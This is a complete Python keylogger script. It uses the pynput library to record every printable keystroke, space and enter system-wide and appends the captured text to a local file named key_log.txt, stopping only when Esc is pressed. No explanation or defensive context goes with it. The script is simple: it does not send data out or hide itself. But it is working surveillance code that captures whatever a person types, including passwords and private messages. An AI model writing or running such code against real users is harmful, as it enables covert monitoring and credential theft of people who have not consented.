from pynput.keyboard import Key, Listener
import logging

log_file = "key_log.txt"
buffer = ""

def on_press(key):
    global buffer
    try:
        if key.char.isprintable():
            buffer += key.char

    except AttributeError:
        if key == Key.space:
            buffer +=" "
        elif key == Key.enter:
            buffer += "\n"

def on_release(key):
    global buffer
    if key in {Key.space, Key.enter}:
        with open(log_file, "a") as f:
            f.write(buffer)
        buffer = ""
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
